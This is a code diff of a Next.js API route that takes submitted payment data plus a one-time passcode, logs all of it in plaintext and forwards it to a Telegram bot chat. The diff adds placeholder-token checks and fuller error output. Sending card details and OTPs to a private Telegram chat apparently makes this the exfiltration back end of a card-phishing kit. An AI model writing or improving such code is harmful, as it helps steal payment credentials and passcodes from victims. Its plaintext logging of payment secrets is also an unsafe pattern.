@@ -90,21 +90,25 @@ export async function POST(request: Request) {
     console.log("💳 PAYMENT DATA RECEIVED:");
     console.log(JSON.stringify({ ...data, otp }, null, 2));
 
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.log("⚠️ Telegram bot token or chat ID not configured - logging data only");
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "your_bot_token_here" || TELEGRAM_CHAT_ID === "your_chat_id_here") {
+      console.log("⚠️ Telegram bot token or chat ID not configured or using placeholders - logging data only");
+      console.log("💳 PAYMENT DATA (LOG ONLY):", JSON.stringify({ ...data, otp }, null, 2));
       return NextResponse.json({ 
         success: true, 
         otp: otp,
-        message: "Payment data logged successfully" 
+        message: "Payment data logged successfully (Development Mode)" 
       });
     }
 
     const result = await sendToTelegram(data);
 
     if (!result.ok) {
-      console.error("Telegram API error:", result);
+      console.error("Telegram API error details:", JSON.stringify(result, null, 2));
       return NextResponse.json(
-        { message: "Failed to send to Telegram" },
+        { 
+          message: "Telegram API Error", 
+          details: result.description || "Unknown Telegram error"
+        },
         { status: 500 }
       );
     }
